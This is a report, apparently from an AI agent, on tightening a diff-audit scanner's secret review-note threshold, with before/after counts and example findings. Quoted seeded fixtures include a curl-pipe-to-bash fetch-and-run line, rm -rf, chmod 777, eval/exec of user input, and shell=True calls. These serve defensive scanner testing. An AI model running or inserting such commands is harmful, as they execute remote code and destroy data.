# Hermes Stage 1 Review-Note Threshold Tightening Report v0

## Verdict

[HERMES_STAGE1_REVIEW_NOTE_THRESHOLD_TIGHTENING_EXECUTED_WITH_WATCH]

## Command Run

`python3 app/work/space-skill-sandbox/outputs/05_15_sequential_execution_cards/hermes_stage1_review_note_threshold_tightening_v0/review_note_threshold_tightening.py`

## Files Read

- app/work/space-skill-sandbox/outputs/05_15_sequential_execution_cards/hermes_stage1_refined_diff_audit_independent_rerun_v0/independent_refined_diff_audit_report.md
- app/work/space-skill-sandbox/outputs/05_15_sequential_execution_cards/hermes_stage1_refined_diff_audit_independent_rerun_v0/independent_refined_diff_audit_receipt.json
- app/work/space-skill-sandbox/outputs/05_15_sequential_execution_cards/hermes_stage1_historical_code_diff_sample_audit_v0/patches/
- app/work/space-skill-sandbox/outputs/05_15_sequential_execution_cards/hermes_stage1_seeded_true_positive_pressure_v0/fixtures/
- app/work/space-skill-sandbox/outputs/05_15_sequential_execution_cards/hermes_stage1_historical_code_diff_sample_audit_v0/patches/4601f7c18.patch
- app/work/space-skill-sandbox/outputs/05_15_sequential_execution_cards/hermes_stage1_historical_code_diff_sample_audit_v0/patches/4e0389a4d.patch
- app/work/space-skill-sandbox/outputs/05_15_sequential_execution_cards/hermes_stage1_historical_code_diff_sample_audit_v0/patches/a542716f3.patch
- app/work/space-skill-sandbox/outputs/05_15_sequential_execution_cards/hermes_stage1_historical_code_diff_sample_audit_v0/patches/a998543da.patch
- app/work/space-skill-sandbox/outputs/05_15_sequential_execution_cards/hermes_stage1_seeded_true_positive_pressure_v0/fixtures/app_source_true_positive.patch
- app/work/space-skill-sandbox/outputs/05_15_sequential_execution_cards/hermes_stage1_seeded_true_positive_pressure_v0/fixtures/benign_semantic_noise.patch
- app/work/space-skill-sandbox/outputs/05_15_sequential_execution_cards/hermes_stage1_seeded_true_positive_pressure_v0/fixtures/config_true_positive.patch
- app/work/space-skill-sandbox/outputs/05_15_sequential_execution_cards/hermes_stage1_seeded_true_positive_pressure_v0/fixtures/docs_tests_noise.patch
- app/work/space-skill-sandbox/outputs/05_15_sequential_execution_cards/hermes_stage1_seeded_true_positive_pressure_v0/fixtures/script_deploy_true_positive.patch

## Files Created

- app/work/space-skill-sandbox/outputs/05_15_sequential_execution_cards/hermes_stage1_review_note_threshold_tightening_v0/review_note_threshold_tightening.py
- app/work/space-skill-sandbox/outputs/05_15_sequential_execution_cards/hermes_stage1_review_note_threshold_tightening_v0/review_note_threshold_tightening_report.md
- app/work/space-skill-sandbox/outputs/05_15_sequential_execution_cards/hermes_stage1_review_note_threshold_tightening_v0/review_note_threshold_tightening_receipt.json

## Before Counts From Hermes Independent Rerun

- historical_hard_findings: 1
- historical_review_notes: 118
- seeded_hard_findings: 19
- seeded_review_notes: 31

## After Counts From Tightened Threshold

- historical_hard_findings: 1
- historical_review_notes: 7
- seeded_hard_findings: 19
- seeded_review_notes: 27
- historical_suppressed_review_notes: 22
- seeded_suppressed_review_notes: 2

## Hard-Finding Stability Check

- hard_findings_stable: true
- expected: historical_hard_findings stays 1; seeded_hard_findings stays 19
- result: hard rules unchanged; only secret_boundary review-note threshold was tightened

## Historical Patch Results

### 4601f7c18.patch
- files_touched_count: 2
- added_lines_seen: 138
- deleted_lines_seen: 25
- hard_findings: 0
- review_notes: 0
- suppressed_review_notes: 0
- contexts: `{"app_source": 2}`
- hard finding examples:
- none
- retained review note examples:
- none
- suppressed review-note examples:
- none

### 4e0389a4d.patch
- files_touched_count: 5
- added_lines_seen: 3714
- deleted_lines_seen: 0
- hard_findings: 1
- review_notes: 1
- suppressed_review_notes: 3
- contexts: `{"app_source": 4, "config_or_env_like": 1}`
- hard finding examples:
- hard_finding | app_source_non_secret_rule | app/ui/integrated_engine/main.tsx:3686 | context=app_source | `console.log("VectorFL Sandbox: Starting Boot Sequence...");`
- retained review note examples:
- review_note | unresolved_marker | app/runtime/vectorfl_integrated_engine_api.py:651 | context=app_source | `"current_signal": "extract repeated pressure before TODO language",`
- suppressed review-note examples:
- suppressed | ordinary_token_processing_noise | app/runtime/vectorfl_integrated_engine_api.py:160 | context=app_source | `PATH_TOKEN_RE = re.compile(r"(?:(?:runtime|docs|app|scripts|references|gemini)/[A-Za-z0-9._@%+=:,/\\-]+)")`
- suppressed | ordinary_token_processing_noise | app/runtime/vectorfl_integrated_engine_api.py:186 | context=app_source | `for match in PATH_TOKEN_RE.findall(text):`
- suppressed | ordinary_token_processing_noise | app/runtime/vectorfl_integrated_engine_api.py:1769 | context=app_source | `if any(token in explicit_tail for token in tokens):`

### a542716f3.patch
- files_touched_count: 7
- added_lines_seen: 1333
- deleted_lines_seen: 8
- hard_findings: 0
- review_notes: 0
- suppressed_review_notes: 3
- contexts: `{"app_source": 7}`
- hard finding examples:
- none
- retained review note examples:
- none
- suppressed review-note examples:
- suppressed | ordinary_token_processing_noise | app/core/runtime/lower_support_layers.py:223 | context=app_source | `def _tokenize(text: str) -> list[str]:`
- suppressed | ordinary_token_processing_noise | app/core/runtime/lower_support_layers.py:227 | context=app_source | `for token in tokens`
- suppressed | ordinary_token_processing_noise | app/core/runtime/lower_support_layers.py:350 | context=app_source | `counter.update(_tokenize(text))`

### a998543da.patch
- files_touched_count: 6
- added_lines_seen: 11322
- deleted_lines_seen: 0
- hard_findings: 0
- review_notes: 6
- suppressed_review_notes: 16
- contexts: `{"app_source": 3, "scripts_or_deploy": 1, "tests_or_fixtures": 2}`
- hard finding examples:
- none
- retained review note examples:
- review_note | semantic_token_assignment | app/core/runtime/live_input_space.py:5292 | context=app_source | `token = _normalize_token(value)`
- review_note | semantic_token_assignment | app/core/runtime/live_input_space.py:5296 | context=app_source | `token = _normalize_token(str(value).strip())`
- review_note | semantic_token_assignment | app/core/runtime/live_input_space.py:5979 | context=app_source | `token = _normalize_token(value)`
- review_note | semantic_token_assignment | app/core/runtime/live_input_space.py:5983 | context=app_source | `token = _normalize_token(str(value).strip())`
- review_note | non_secret_pattern_outside_hard_context | scripts/ingest_fragments.py:6112 | context=scripts_or_deploy | `print("usage: ingest_fragments.py <runtime_root> <fragments.json> [--project]")`
- review_note | non_secret_pattern_outside_hard_context | scripts/ingest_fragments.py:6308 | context=scripts_or_deploy | `print(json.dumps(result, ensure_ascii=False, indent=2))`
- suppressed review-note examples:
- suppressed | ordinary_token_processing_noise | app/core/runtime/live_input_space.py:4310 | context=app_source | `canonicalizable_token_pair_count=int(promotion_review_data.get("canonicalizable_token_pair_count", 0) or 0),`
- suppressed | ordinary_token_processing_noise | app/core/runtime/live_input_space.py:5045 | context=app_source | `canonicalizable_token_pair_count=int(direct_overlap_review.get("canonicalizable_token_pair_count", 0) or 0),`
- suppressed | ordinary_token_processing_noise | app/core/runtime/live_input_space.py:5059 | context=app_source | `canonicalizable_token_pair_count=int(direct_overlap_review.get("canonicalizable_token_pair_count", 0) or 0),`
- suppressed | ordinary_token_processing_noise | app/core/runtime/live_input_space.py:5171 | context=app_source | `overlap_tokens = set(semantic_overlap + structural_overlap + process_overlap + object_overlap)`
- suppressed | ordinary_token_processing_noise | app/core/runtime/live_input_space.py:5172 | context=app_source | `translated_but_not_canonicalized_count = len([value for value in translated_hits if value not in overlap_tokens])`
- suppressed | ordinary_token_processing_noise | app/core/runtime/live_input_space.py:5282 | context=app_source | `def _collect_anchor_tokens(materials: Sequence[Dict[str, object]]) -> Set[str]:`
- suppressed | ordinary_token_processing_noise | app/core/runtime/live_input_space.py:5294 | context=app_source | `tokens.add(token)`
- suppressed | ordinary_token_processing_noise | app/core/runtime/live_input_space.py:5298 | context=app_source | `tokens.add(token)`
- suppressed | ordinary_token_processing_noise | app/core/runtime/live_input_space.py:5309 | context=app_source | `for token in _collect_anchor_tokens(materials):`
- suppressed | ordinary_token_processing_noise | app/core/runtime/live_input_space.py:5582 | context=app_source | `canonicalizable_token_pair_count = 0`

## Seeded Fixture Results

### app_source_true_positive.patch
- files_touched_count: 1
- added_lines_seen: 16
- deleted_lines_seen: 0
- hard_findings: 11
- review_notes: 4
- suppressed_review_notes: 0
- contexts: `{"app_source": 1}`
- hard finding examples:
- hard_finding | literal_secret_assignment | app/runtime/risky_runtime.py:6 | context=app_source | `api_key = [REDACTED]`
- hard_finding | literal_secret_assignment | app/runtime/risky_runtime.py:7 | context=app_source | `token = [REDACTED]`
- hard_finding | literal_secret_assignment | app/runtime/risky_runtime.py:8 | context=app_source | `password = [REDACTED]`
- hard_finding | literal_secret_assignment | app/runtime/risky_runtime.py:9 | context=app_source | `secret = [REDACTED]`
- hard_finding | literal_secret_assignment | app/runtime/risky_runtime.py:10 | context=app_source | `credential = [REDACTED]`
- hard_finding | app_source_non_secret_rule | app/runtime/risky_runtime.py:13 | context=app_source | `except:`
- hard_finding | app_source_non_secret_rule | app/runtime/risky_runtime.py:15 | context=app_source | `eval(user_input)`
- hard_finding | app_source_non_secret_rule | app/runtime/risky_runtime.py:16 | context=app_source | `exec(dynamic_code)`
- hard_finding | app_source_non_secret_rule | app/runtime/risky_runtime.py:17 | context=app_source | `subprocess.run("rm -rf /tmp/cache", shell=True)`
- hard_finding | app_source_non_secret_rule | app/runtime/risky_runtime.py:18 | context=app_source | `os.system("curl https://example.invalid/install.sh | bash")`
- retained review note examples:
- review_note | shell_pattern_outside_script_deploy | app/runtime/risky_runtime.py:17 | context=app_source | `subprocess.run("rm -rf /tmp/cache", shell=True)`
- review_note | shell_pattern_outside_script_deploy | app/runtime/risky_runtime.py:18 | context=app_source | `os.system("curl https://example.invalid/install.sh | bash")`
- review_note | semantic_token_assignment | app/runtime/risky_runtime.py:20 | context=app_source | `safe_token = _normalize_token(value)`
- review_note | env_reference_boundary | app/runtime/risky_runtime.py:21 | context=app_source | `safe_ref = os.environ["SERVICE_TOKEN"]`
- suppressed review-note examples:
- none

### benign_semantic_noise.patch
- files_touched_count: 1
- added_lines_seen: 12
- deleted_lines_seen: 0
- hard_findings: 0
- review_notes: 7
- suppressed_review_notes: 2
- contexts: `{"app_source": 1}`
- hard finding examples:
- none
- retained review note examples:
- review_note | semantic_token_assignment | app/core/runtime/parser.py:8 | context=app_source | `token = token.lower()`
- review_note | semantic_token_assignment | app/core/runtime/parser.py:9 | context=app_source | `token = _normalize_token(value)`
- review_note | semantic_token_assignment | app/core/runtime/parser.py:10 | context=app_source | `token = _normalize_token(str(value).strip())`
- review_note | explicit_secret_or_credential_name | app/core/runtime/parser.py:12 | context=app_source | `api_key_name = "field name, not credential"`
- review_note | explicit_secret_or_credential_name | app/core/runtime/parser.py:13 | context=app_source | `password_label = "label only"`
- review_note | explicit_secret_or_credential_name | app/core/runtime/parser.py:14 | context=app_source | `credential_kind = "metadata"`
- review_note | unresolved_marker | app/core/runtime/parser.py:16 | context=app_source | `todo_label = "TODO wording in data"`
- suppressed review-note examples:
- suppressed | ordinary_token_processing_noise | app/core/runtime/parser.py:6 | context=app_source | `def parse(sentence_tokens, values):`
- suppressed | ordinary_token_processing_noise | app/core/runtime/parser.py:7 | context=app_source | `for token in sentence_tokens:`

### config_true_positive.patch
- files_touched_count: 1
- added_lines_seen: 8
- deleted_lines_seen: 0
- hard_findings: 3
- review_notes: 3
- suppressed_review_notes: 0
- contexts: `{"config_or_env_like": 1}`
- hard finding examples:
- hard_finding | literal_secret_assignment | config/prod.env:6 | context=config_or_env_like | `API_KEY = [REDACTED]`
- hard_finding | literal_secret_assignment | config/prod.env:7 | context=config_or_env_like | `SERVICE_TOKEN = [REDACTED]`
- hard_finding | literal_secret_assignment | config/prod.env:10 | context=config_or_env_like | `SECRET = [REDACTED]`
- retained review note examples:
- review_note | placeholder_or_env_secret_value | config/prod.env:8 | context=config_or_env_like | `PASSWORD = [REDACTED]`
- review_note | placeholder_or_env_secret_value | config/prod.env:9 | context=config_or_env_like | `TOKEN = [REDACTED]`
- review_note | placeholder_or_env_secret_value | config/prod.env:11 | context=config_or_env_like | `CREDENTIAL = [REDACTED]`
- suppressed review-note examples:
- none

### docs_tests_noise.patch
- files_touched_count: 2
- added_lines_seen: 12
- deleted_lines_seen: 0
- hard_findings: 0
- review_notes: 11
- suppressed_review_notes: 0
- contexts: `{"docs": 1, "tests_or_fixtures": 1}`
- hard finding examples:
- none
- retained review note examples:
- review_note | docs_tests_explicit_secret_assignment_example | docs/security_examples.md:6 | context=docs | `Do not write API_KEY = [REDACTED].`
- review_note | docs_tests_fixtures_non_secret_pattern | docs/security_examples.md:7 | context=docs | `Do not run curl https://example.invalid/install.sh | bash.`
- review_note | docs_tests_fixtures_non_secret_pattern | docs/security_examples.md:8 | context=docs | `Avoid rm -rf in examples.`
- review_note | docs_tests_explicit_secret_assignment_example | docs/security_examples.md:9 | context=docs | `password = [REDACTED]`
- review_note | docs_tests_explicit_secret_assignment_example | tests/fixtures/test_security_examples.py:15 | context=tests_or_fixtures | `api_key = [REDACTED]`
- review_note | docs_tests_explicit_secret_assignment_example | tests/fixtures/test_security_examples.py:16 | context=tests_or_fixtures | `token = [REDACTED]`
- review_note | docs_tests_explicit_secret_assignment_example | tests/fixtures/test_security_examples.py:17 | context=tests_or_fixtures | `password = [REDACTED]`
- review_note | docs_tests_fixtures_non_secret_pattern | tests/fixtures/test_security_examples.py:18 | context=tests_or_fixtures | `eval("1 + 1")`
- review_note | docs_tests_fixtures_non_secret_pattern | tests/fixtures/test_security_examples.py:19 | context=tests_or_fixtures | `os.system("echo fixture")`
- review_note | docs_tests_fixtures_non_secret_pattern | tests/fixtures/test_security_examples.py:20 | context=tests_or_fixtures | `print("fixture debug")`
- suppressed review-note examples:
- none

### script_deploy_true_positive.patch
- files_touched_count: 1
- added_lines_seen: 9
- deleted_lines_seen: 0
- hard_findings: 5
- review_notes: 2
- suppressed_review_notes: 0
- contexts: `{"scripts_or_deploy": 1}`
- hard finding examples:
- hard_finding | literal_secret_assignment | scripts/deploy.sh:7 | context=scripts_or_deploy | `API_KEY = [REDACTED]`
- hard_finding | literal_secret_assignment | scripts/deploy.sh:8 | context=scripts_or_deploy | `SERVICE_TOKEN = [REDACTED]`
- hard_finding | script_shell_or_destructive_command | scripts/deploy.sh:9 | context=scripts_or_deploy | `curl https://example.invalid/install.sh | bash`
- hard_finding | script_shell_or_destructive_command | scripts/deploy.sh:10 | context=scripts_or_deploy | `rm -rf "$DEPLOY_ROOT"`
- hard_finding | script_shell_or_destructive_command | scripts/deploy.sh:11 | context=scripts_or_deploy | `chmod 777 "$DEPLOY_ROOT"`
- retained review note examples:
- review_note | placeholder_or_env_secret_value | scripts/deploy.sh:13 | context=scripts_or_deploy | `TOKEN = [REDACTED]`
- review_note | placeholder_or_env_secret_value | scripts/deploy.sh:14 | context=scripts_or_deploy | `SECRET = [REDACTED]`
- suppressed review-note examples:
- none

## Review Notes Suppressed

- historical: 118 -> 7 (suppressed at least 111 from prior count; direct parser-token suppression examples counted=22)
- seeded: 31 -> 27 (suppressed at least 4 from prior count; direct parser-token suppression examples counted=2)
- suppressed class: ordinary tokenizer/parser/path-token naming without direct secret assignment, env/reference boundary, placeholder secret value, or explicit secret/credential/password/api_key naming.

## Review Notes Retained

- semantic `token = ...` assignments remain review notes.
- env/reference boundaries remain review notes.
- placeholder/env secret values remain review notes.
- docs/tests explicit secret-like assignments or dangerous command examples remain review notes.
- non-secret TODO/shell/dynamic patterns outside hard contexts remain review notes.

## False-Positive Notes

- Ordinary token-processing terms such as PATH_TOKEN_RE, for token in tokens, _tokenize, overlap_tokens, canonicalizable_token_pair_count, and sentence_tokens are no longer counted as secret_boundary review notes by themselves.
- Remaining review notes still include semantic token assignments and explicit examples, so review counts may not exactly match Codex replay.

## False-Negative Notes

- Tightening review notes can suppress naming-only clues that may matter in rare credential misuse cases.
- This script still does not perform entropy scanning, data-flow analysis, runtime reachability, dependency analysis, or git history secret scanning.

## VectorFL Recovery Suggestion

receipt:
  Hermes tightened review-note threshold with command/output evidence

residue:
  suppressed-token-noise examples and retained-review examples

candidate:
  refined diff-audit rule set becomes stronger if hard findings remain stable and review noise decreases

component:
  HOLD until broader real sample and user/Codex explicit approval

STOP:
  patch/commit/skill/memory/cron/config/MCP/network/VectorFL authority mutation

## WATCH

review-note tightening may strengthen candidate status but still does not authorize component/workflow/skill/baseline

## HOLD

- no source files modified
- no prior audit files modified
- no patches applied
- no git used
- no git add / commit / reset / checkout
- no package install
- no network / browser / MCP
- no Hermes memory / skill / cron / config edit
- no AGENTS.md / SKILL.md update
- no VectorFL authority update
- no current-position / output_manifest update
- no baseline / workflow / schema / registry / ontology promotion
- no declared output directory outside write
